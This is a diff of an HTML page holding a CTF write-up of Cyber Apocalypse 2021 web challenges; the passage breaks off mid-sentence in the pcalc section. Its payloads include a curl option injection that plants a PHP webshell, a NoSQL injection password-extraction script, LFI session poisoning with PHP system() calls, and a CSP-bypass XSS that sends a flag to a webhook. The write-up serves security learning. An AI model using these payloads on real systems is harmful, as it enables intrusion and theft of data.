@@ -43,84 +43,79 @@
 		    </section>
 
       <section id="wrapper">
- <section class="wrapper style4">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Overview
-    </h1>
-    <p>
-     The aliens have come to attack the earth and I had to hack into their web assets to stop their onslaught! I grabbed some friends from my university and some emus to form the team
-     <strong>
-      EmusArmedWithLaptops
-     </strong>
-     to hack into their assets. In the end, we were able to defeat 41 of the 62 challenges that the aliens presented, getting 51st place internationally and 2nd in Australia.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/score.png"/>
-    </p>
-    <p>
-     Personally, I focused on compromising their web assets that had a wide variety of vulnerabilities that were really fun to hack into. These exploits ranged from cross-site scripting (XSS), filter bypassing, MongoDB injection and exploiting Google Cloud Compute Engine! I will go into the details about my analysis, thought process and exploitation methodology for each of the web challenges that I solved.
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     CaaS
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{f1le_r3trieval_4s_a_s3rv1ce}
-       </td>
-       <td>
-        797
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     I have no idea why, but the aliens had a Curl as a Service (CaaS) web interface for their alien buddies to check the status of websites using
-     <code>
-      
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+<h1 class="major">
+ Overview
+</h1>
+<p>
+ The aliens have come to attack the earth and I had to hack into their web assets to stop their onslaught! I grabbed some friends from my university and some emus to form the team
+ <strong>
+  EmusArmedWithLaptops
+ </strong>
+ to hack into their assets. In the end, we were able to defeat 41 of the 62 challenges that the aliens presented, getting 51st place internationally and 2nd in Australia.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/score.png"/>
+</p>
+<p>
+ Personally, I focused on compromising their web assets that had a wide variety of vulnerabilities that were really fun to hack into. These exploits ranged from cross-site scripting (XSS), filter bypassing, MongoDB injection and exploiting Google Cloud Compute Engine! I will go into the details about my analysis, thought process and exploitation methodology for each of the web challenges that I solved.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ CaaS
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{f1le_r3trieval_4s_a_s3rv1ce}
+   </td>
+   <td>
+    797
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ I have no idea why, but the aliens had a Curl as a Service (CaaS) web interface for their alien buddies to check the status of websites using
+ <code>
   curl
- 
-     </code>
-     . I guess they never heard of a terminal before...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/caas.png"/>
-    </p>
-    <p>
-     Checking the source code for the website that was provided, we can see that
-     <code>
-      
+ </code>
+ . I guess they never heard of a terminal before...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/caas.png"/>
+</p>
+<p>
+ Checking the source code for the website that was provided, we can see that
+ <code>
   curl
- 
-     </code>
-     is executed within the PHP class
-     <code>
-      
+ </code>
+ is executed within the PHP class
+ <code>
   CommandModel
- 
-     </code>
-     using the URL given by the user.
-    </p>
-    <pre class="codehilite"><code class="language-php">class CommandModel
+ </code>
+ using the URL given by the user.
+</p>
+<pre class="codehilite"><code class="language-php">class CommandModel
 {
     public function __construct($url)
     {
@@ -134,152 +129,127 @@
     }
 }
 </code></pre>
-    <p>
-     The
-     <code>
-      
+<p>
+ The
+ <code>
   escapeshellcmd
- 
-     </code>
-     meant that I could not stack additional commands to the my URL. However,
-     <code>
-      
+ </code>
+ meant that I could not stack additional commands to the my URL. However,
+ <code>
   escapeshellcmd
- 
-     </code>
-     only mitigates stacked shell commands and
-     <strong>
-      not command options
-     </strong>
-     . The PHP function
-     <code>
-      
+ </code>
+ only mitigates stacked shell commands and
+ <strong>
+  not command options
+ </strong>
+ . The PHP function
+ <code>
   escapedshellarg
- 
-     </code>
-     should of been used instead by the aliens if they wanted their site to be secure.
-    </p>
-    <p>
-     To exploit, all I had to was point the CaaS to a PHP webshell and save the file onto the server using the following payload
-     <code>
-      
+ </code>
+ should of been used instead by the aliens if they wanted their site to be secure.
+</p>
+<p>
+ To exploit, all I had to was point the CaaS to a PHP webshell and save the file onto the server using the following payload
+ <code>
   https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o oWow3bsh3ll.php
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/caas_pwned.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style3">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Wild Goose Hunt
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
-       </td>
-       <td>
-        515
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     For Wild Goose Hunt, the first thing that I thought of was that it was vulnerable to MongoDB injection (also known as NoSQLi).
-    </p>
-    <p>
-     To test that it was vulnerable, I tried the authentication bypass using the NoSQLi payload. How I did this was by intercepting the POST request I sent when I tried to login to the admin account and modifying the POST parameter
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/caas_pwned.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Wild Goose Hunt
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
+   </td>
+   <td>
+    515
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ For Wild Goose Hunt, the first thing that I thought of was that it was vulnerable to MongoDB injection (also known as NoSQLi).
+</p>
+<p>
+ To test that it was vulnerable, I tried the authentication bypass using the NoSQLi payload. How I did this was by intercepting the POST request I sent when I tried to login to the admin account and modifying the POST parameter
+ <code>
   password=something
- 
-     </code>
-     to
-     <code>
-      
+ </code>
+ to
+ <code>
   password[$ne]=something
- 
-     </code>
-     . The
-     <code>
-      
+ </code>
+ . The
+ <code>
   [$ne]
- 
-     </code>
-     tells the MongoDB to search for entries that
-     <strong>
-      do not equal
-     </strong>
-     the password that I sent, therefore it bypasses authentication and confirms that the site is vulnerable NoSQLi. With no surprise I bypassed the login and confirmed that NoSQLi was the way.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/goose_bypass.png"/>
-    </p>
-    <p>
-     Now authentication bypass is great and all, but I still did not have the flag. This is because it is actually the password of the admin user. However, I can use regex to extract the password by character until I have the whole thing. How this works is by replacing the
-     <code>
-      
+ </code>
+ tells the MongoDB to search for entries that
+ <strong>
+  do not equal
+ </strong>
+ the password that I sent, therefore it bypasses authentication and confirms that the site is vulnerable NoSQLi. With no surprise I bypassed the login and confirmed that NoSQLi was the way.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/goose_bypass.png"/>
+</p>
+<p>
+ Now authentication bypass is great and all, but I still did not have the flag. This is because it is actually the password of the admin user. However, I can use regex to extract the password by character until I have the whole thing. How this works is by replacing the
+ <code>
   password=
- 
-     </code>
-     section within the POST request body to
-     <code>
-      
+ </code>
+ section within the POST request body to
+ <code>
   password[$regex]=^
- 
-     </code>
-     . The regex pattern
-     <code>
-      
+ </code>
+ . The regex pattern
+ <code>
   ^
- 
-     </code>
-     matches to the start of the string, so as an example if I sent
-     <code>
-      
+ </code>
+ matches to the start of the string, so as an example if I sent
+ <code>
   password[$regex]=^A
- 
-     </code>
-     I would not be able to log in, but
-     <code>
-      
+ </code>
+ I would not be able to log in, but
+ <code>
   password[$regex]=^C
- 
-     </code>
-     would bypass the authentication since 'C' is the first character of the CTF flags (
-     <code>
-      
+ </code>
+ would bypass the authentication since 'C' is the first character of the CTF flags (
+ <code>
   CHTB{...}
- 
-     </code>
-     ). I could then keep on adding characters to this regex pattern until I have the full password. For more details check out
-     <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">
-      this resource
-     </a>
-     .
-    </p>
-    <p>
-     The exploit code that I wrote is down below. It can be a little slow, but gave me plenty of time to brew another coffee for the next challenges.
-    </p>
-    <pre class="codehilite"><code class="language-python">import http.client,string,json,urllib.parse
+ </code>
+ ). I could then keep on adding characters to this regex pattern until I have the full password. For more details check out
+ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">
+  this resource
+ </a>
+ .
+</p>
+<p>
+ The exploit code that I wrote is down below. It can be a little slow, but gave me plenty of time to brew another coffee for the next challenges.
+</p>
+<pre class="codehilite"><code class="language-python">import http.client,string,json,urllib.parse
 
 username = "admin"
 password = "CHTB{"
@@ -310,453 +280,387 @@ while exe:
                 exe = False
             break
 </code></pre>
-   </div>
-  </div>
- </section>
- <section class="wrapper style1 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Extortion
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{th4ts_4_w31rd3xt0rt10n@#$?}
-       </td>
-       <td>
-        192
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     This website appeared to be some platform for sending UFOs to extort humans. It had fairly limited functionality where you can view the different types of UFOs you could send or specify a custom one.
-    </p>
-    <p>
-     The first thing that I noticed was when you view the different types of UFO, you can see the PHP file where the information is stored in from the URL GET parameter. For an example
-     <code>
-      
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Extortion
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{th4ts_4_w31rd3xt0rt10n@#$?}
+   </td>
+   <td>
+    192
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ This website appeared to be some platform for sending UFOs to extort humans. It had fairly limited functionality where you can view the different types of UFOs you could send or specify a custom one.
+</p>
+<p>
+ The first thing that I noticed was when you view the different types of UFO, you can see the PHP file where the information is stored in from the URL GET parameter. For an example
+ <code>
   http://138.68.147.93:31724/?f=airship.php
- 
-     </code>
-     . This tells me two things.
-    </p>
-    <ol>
-     <li>
-      The file
-      <code>
-       
+ </code>
+ . This tells me two things.
+</p>
+<ol>
+ <li>
+  The file
+  <code>
    airship.php
-  
-      </code>
-      is most likely included to the
-      <code>
-       
+  </code>
+  is most likely included to the
+  <code>
    index.php
-  
-      </code>
-      page using the PHP
-      <code>
-       
+  </code>
+  page using the PHP
+  <code>
    include
-  
-      </code>
-      function.
-     </li>
-     <li>
-      If there is no user input sanitisation, it can be leveraged as a Local File Inclusion (LFI) exploit.
-     </li>
-     <li>
-      If the server is vulnerable to LFI and uses PHP, it could be leveraged as a code execution exploit if I can include a file with user input that executes PHP code.
-     </li>
-    </ol>
-    <p>
-     To test if it was vulnerable to LFI, I wanted to see if I can open the
-     <code>
-      
+  </code>
+  function.
+ </li>
+ <li>
+  If there is no user input sanitisation, it can be leveraged as a Local File Inclusion (LFI) exploit.
+ </li>
+ <li>
+  If the server is vulnerable to LFI and uses PHP, it could be leveraged as a code execution exploit if I can include a file with user input that executes PHP code.
+ </li>
+</ol>
+<p>
+ To test if it was vulnerable to LFI, I wanted to see if I can open the
+ <code>
   /etc/passwd
- 
-     </code>
-     file on the server by prepending a bunch of
-     <code>
-      
+ </code>
+ file on the server by prepending a bunch of
+ <code>
   ../
- 
-     </code>
-     , like
-     <code>
-      
+ </code>
+ , like
+ <code>
   http://138.68.147.93:31724/?f=../../../../../../../etc/passwd
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_lfi.png"/>
-    </p>
-    <p>
-     Noice it is vulnerable to LFI! Now I wanted to exploit the LFI vulnerability to trigger code execution by including either the log or PHP session files. First I used
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_lfi.png"/>
+</p>
+<p>
+ Noice it is vulnerable to LFI! Now I wanted to exploit the LFI vulnerability to trigger code execution by including either the log or PHP session files. First I used
+ <code>
   wfuzz
- 
-     </code>
-     to enumerate the linux file system by searching for common linux files.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_common_unix.png"/>
-    </p>
-    <p>
-     I couldn't use any of these files since none of them would store any input from the user. The next thing I tried was searching for the log stream for
-     <code>
-      
+ </code>
+ to enumerate the linux file system by searching for common linux files.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_common_unix.png"/>
+</p>
+<p>
+ I couldn't use any of these files since none of them would store any input from the user. The next thing I tried was searching for the log stream for
+ <code>
   apache2
- 
-     </code>
-     within
-     <code>
-      
+ </code>
+ within
+ <code>
   /proc/self/fd/&lt;number&gt;
- 
-     </code>
-     . This was also fruitless as well.
-    </p>
-    <p>
-     Eventually, I revisited the website and noticed that a session cookie was set when I visited
-     <code>
-      
+ </code>
+ . This was also fruitless as well.
+</p>
+<p>
+ Eventually, I revisited the website and noticed that a session cookie was set when I visited
+ <code>
   /send.php
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_sess.png"/>
-    </p>
-    <p>
-     This is really significant since PHP saves the session data to the file system, meaning that I can include that instead to get my juicy code execution. However, now I need to find where PHP session files would be located. For PHP if a location is not specifically configured, the default location for session files would be at
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_sess.png"/>
+</p>
+<p>
+ This is really significant since PHP saves the session data to the file system, meaning that I can include that instead to get my juicy code execution. However, now I need to find where PHP session files would be located. For PHP if a location is not specifically configured, the default location for session files would be at
+ <code>
   /tmp/sess_&lt;Session ID&gt;
- 
-     </code>
-     . For the above example, I tried including
-     <code>
-      
+ </code>
+ . For the above example, I tried including
+ <code>
   /tmp/sess_e48321b716678ec1500331f0cab2b873
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_sess_lfi.png"/>
-    </p>
-    <p>
-     PERFECT! We can see that the data I sent previously is now stored in this session file, meaning that I can chuck in some PHP to start executing code, such as
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/extortion_sess_lfi.png"/>
+</p>
+<p>
+ PERFECT! We can see that the data I sent previously is now stored in this session file, meaning that I can chuck in some PHP to start executing code, such as
+ <code>
   &lt;?php system("cat /etc/passwd");?&gt;
- 
-     </code>
-     to execute my commands. I did a little enumeration to locate the flag and quickly found it located in the website's root directory with the name
-     <code>
-      
+ </code>
+ to execute my commands. I did a little enumeration to locate the flag and quickly found it located in the website's root directory with the name
+ <code>
   flag-&lt;long string of random characters&gt;.txt
- 
-     </code>
-     . You can read this flag if you send
-     <code>
-      
+ </code>
+ . You can read this flag if you send
+ <code>
   &lt;?php system("cat flag*");?&gt;
- 
-     </code>
-     as the payload.
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style2">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     The Galactic Times
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
-       </td>
-       <td>
-        159
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     The galactic times is main online newspaper for the attacking aliens.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/times.png"/>
-    </p>
-    <p>
-     Analysing the source code that was provided showed that there are two pages, a human readable one at
-     <code>
-      
+ </code>
+ as the payload.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ The Galactic Times
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
+   </td>
+   <td>
+    159
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ The galactic times is main online newspaper for the attacking aliens.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/times.png"/>
+</p>
+<p>
+ Analysing the source code that was provided showed that there are two pages, a human readable one at
+ <code>
   /
- 
-     </code>
-     and an alien specific one at
-     <code>
-      
+ </code>
+ and an alien specific one at
+ <code>
   /alien
- 
-     </code>
-     that we wanted to access to get the flag. We can also see that there is a feedback functionality at
-     <code>
-      
+ </code>
+ that we wanted to access to get the flag. We can also see that there is a feedback functionality at
+ <code>
   /feedback
- 
-     </code>
-     and
-     <code>
-      
+ </code>
+ and
+ <code>
   /list
- 
-     </code>
-     for viewing the feedback that is visited by an internal bot. Both
-     <code>
-      
+ </code>
+ for viewing the feedback that is visited by an internal bot. Both
+ <code>
   /alien
- 
-     </code>
-     and
-     <code>
-      
+ </code>
+ and
+ <code>
   /list
- 
-     </code>
-     can only be accessed from
-     <code>
-      
+ </code>
+ can only be accessed from
+ <code>
   localhost
- 
-     </code>
-     so I could not directly view those pages. However, I quickly noticed that there was a XSS vulnerability that is triggered when the feedback is displayed at
-     <code>
-      
+ </code>
+ so I could not directly view those pages. However, I quickly noticed that there was a XSS vulnerability that is triggered when the feedback is displayed at
+ <code>
   /list
- 
-     </code>
-     . The only problem is that the website had a
-     <em>
-      Content Security Policy
-     </em>
-     (CSP) which meant that I could not directly use inline JavaScript or use external sources.
-    </p>
-    <p>
-     CSP
-    </p>
-    <pre class="codehilite"><code>Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
+ </code>
+ . The only problem is that the website had a
+ <em>
+  Content Security Policy
+ </em>
+ (CSP) which meant that I could not directly use inline JavaScript or use external sources.
+</p>
+<p>
+ CSP
+</p>
+<pre class="codehilite"><code>Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
 </code></pre>
-    <p>
-     However, this CSP had specified
-     <code>
-      
+<p>
+ However, this CSP had specified
+ <code>
   unsafe-eval
- 
-     </code>
-     for scripts from
-     <a href="https://cdnjs.cloudflare.com/">
-      https://cdnjs.cloudflare.com/
-     </a>
-     (from the CSP:
-     <code>
-      
+ </code>
+ for scripts from
+ <a href="https://cdnjs.cloudflare.com/">
+  https://cdnjs.cloudflare.com/
+ </a>
+ (from the CSP:
+ <code>
   script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;
- 
-     </code>
-     ). After a bit of research and
-     <a href="https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d">
-      reading this article
-     </a>
-     , I realised that I can execute JavaScript using
-     <code>
-      
+ </code>
+ ). After a bit of research and
+ <a href="https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d">
+  reading this article
+ </a>
+ , I realised that I can execute JavaScript using
+ <code>
   angular.js
- 
-     </code>
-     .
-    </p>
-    <p>
-     It took some time working on the payload, and I got myself stuck where I could see testing locally that the following code would work except for the final GET request where I would get the flag. I blame it on the fact I didn't have sufficient coffee in my system at this time of night.
-    </p>
-    <pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
+ </code>
+ .
+</p>
+<p>
+ It took some time working on the payload, and I got myself stuck where I could see testing locally that the following code would work except for the final GET request where I would get the flag. I blame it on the fact I didn't have sufficient coffee in my system at this time of night.
+</p>
+<pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
 &lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];fetch("https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag)});//');}} &lt;/div&gt;
 </code></pre>
-    <p>
-     Fortunately, one of my team members stepped in and realised that I was being a bit of a "dumb dumb" and the CSP would be blocking the final request. However, we could use
-     <code>
-      
+<p>
+ Fortunately, one of my team members stepped in and realised that I was being a bit of a "dumb dumb" and the CSP would be blocking the final request. However, we could use
+ <code>
   document.location = "https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag
- 
-     </code>
-     to get the flag instead. So the working payload was:
-    </p>
-    <pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
+ </code>
+ to get the flag instead. So the working payload was:
+</p>
+<pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
 &lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];document.location = "https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag;});//');}} &lt;/div&gt;
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/times_flag.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style6 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Cessation
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{c3ss4t10n_n33d_sync1ng_#@$?}
-       </td>
-       <td>
-        199
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     This was a bit of a weird challenge were all I had to do was visit the page
-     <code>
-      
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/times_flag.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Cessation
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{c3ss4t10n_n33d_sync1ng_#@$?}
+   </td>
+   <td>
+    199
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ This was a bit of a weird challenge were all I had to do was visit the page
+ <code>
   /shutdown
- 
-     </code>
-     to get the flag. However, there was a regex mapping that I needed to bypass.
-    </p>
-    <pre class="codehilite"><code>regex_map http://.*/shutdown http://127.0.0.1/403
+ </code>
+ to get the flag. However, there was a regex mapping that I needed to bypass.
+</p>
+<pre class="codehilite"><code>regex_map http://.*/shutdown http://127.0.0.1/403
 regex_map http://.*/ http://127.0.0.1/
 </code></pre>
-    <p>
-     The exploit was pretty simple, instead of putting in
-     <code>
-      
+<p>
+ The exploit was pretty simple, instead of putting in
+ <code>
   http://138.68.182.108:31906/shutdown
- 
-     </code>
-     you go to
-     <code>
-      
+ </code>
+ you go to
+ <code>
   http://138.68.182.108:31906//shutdown
- 
-     </code>
-     . The regex does not match to
-     <code>
-      
+ </code>
+ . The regex does not match to
+ <code>
   http://.*/shutdown
- 
-     </code>
-     due to the extra
-     <code>
-      
+ </code>
+ due to the extra
+ <code>
   /
- 
-     </code>
-     , but the website will still go to the shutdown page.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/cessation.png"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style6">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     pcalc
-    </h1>
-    <table>
-     <thead>
-      <tr>
-       <th>
-        Flag
-       </th>
-       <th>
-        Solves
-       </th>
-      </tr>
-     </thead>
-     <tbody>
-      <tr>
-       <td>
-        CHTB{I_d0nt_n33d_puny_hum4n_l3tt3rs_t0_pwn!}
-       </td>
-       <td>
-        143
-       </td>
-      </tr>
-     </tbody>
-    </table>
-    <p>
-     Oh boi this was a pretty fun challenge! The website was hosting a 'human usable' online calculator.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/pcalc.png"/>
-    </p>
-    <p>
-     Analysing the source code revealed that this code is vulnerable to code execution due to the
-     <code>
-      
+ </code>
+ , but the website will still go to the shutdown page.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/cessation.png"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ pcalc
+</h1>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Flag
+   </th>
+   <th>
+    Solves
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    CHTB{I_d0nt_n33d_puny_hum4n_l3tt3rs_t0_pwn!}
+   </td>
+   <td>
+    143
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ Oh boi this was a pretty fun challenge! The website was hosting a 'human usable' online calculator.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/pcalc.png"/>
+</p>
+<p>
+ Analysing the source code revealed that this code is vulnerable to code execution due to the
+ <code>
   eval
- 
-     </code>
-     function, but it has a really pesky character filter that prevents any quotes or letters getting pass the
-     <code>
-      
+ </code>
+ function, but it has a really pesky character filter that prevents any quotes or letters getting pass the
+ <code>
   preg_match_all
- 
-     </code>
-     .
-    </p>
-    <pre class="codehilite"><code>&lt;?php
+ </code>
+ .
+</p>
+<pre class="codehilite"><code>&lt;?php
 class CalcModel
 {
     public static function getCalc($formula)
@@ -774,127 +678,95 @@ class CalcModel
     }
 }
 </code></pre>
-    <p>
-     I did a bit of research about bypassing
-     <code>
-      
+<p>
+ I did a bit of research about bypassing
+ <code>
   preg_match_all
- 
-     </code>
-     filters. However, I could not find anything useful that would bypass the character filter and have a payload less than 100 characters. I knew that my goal was to discover a way of building strings of letters so I will be able to construct functions and commands like
-     <code>
-      
+ </code>
+ filters. However, I could not find anything useful that would bypass the character filter and have a payload less than 100 characters. I knew that my goal was to discover a way of building strings of letters so I will be able to construct functions and commands like
+ <code>
   system(cat /*)
- 
-     </code>
-     . So a few neat tricks about PHP are prerequisite before I explain the actual exploit.
-    </p>
-    <ul>
-     <li>
-      If you have a string and add
-      <code>
-       
+ </code>
+ . So a few neat tricks about PHP are prerequisite before I explain the actual exploit.
+</p>
+<ul>
+ <li>
+  If you have a string and add
+  <code>
    ()
-  
-      </code>
-      to the end of it, PHP will treat it like a function.
-     </li>
-     <li>
-      <code>
-       
+  </code>
+  to the end of it, PHP will treat it like a function.
+ </li>
+ <li>
+  <code>
    ${}
-  
-      </code>
-      allows you to embed variables, values or object properties into a string.
-     </li>
-    </ul>
-    <p>
-     Now I turned to my good old friend
-     <strong>
-      MATHS
-     </strong>
-     to generate the strings I need. Using the example payload
-     <code>
-      
+  </code>
+  allows you to embed variables, values or object properties into a string.
+ </li>
+</ul>
+<p>
+ Now I turned to my good old friend
+ <strong>
+  MATHS
+ </strong>
+ to generate the strings I need. Using the example payload
+ <code>
   system(cat /*)
- 
-     </code>
-     I need to create the strings
-     <code>
-      
+ </code>
+ I need to create the strings
+ <code>
   system
- 
-     </code>
-     and
-     <code>
-      
+ </code>
+ and
+ <code>
   cat /*
- 
-     </code>
-     without any letters when the
-     <code>
-      
+ </code>
+ without any letters when the
+ <code>
   preg_match_all
- 
-     </code>
-     occurs. The reason why I have to do it for both segments instead for just
-     <code>
-      
+ </code>
+ occurs. The reason why I have to do it for both segments instead for just
+ <code>
   system(cat /*)
- 
-     </code>
-     is because I want to trick to think that
-     <code>
-      
+ </code>
+ is because I want to trick to think that
+ <code>
   system
- 
-     </code>
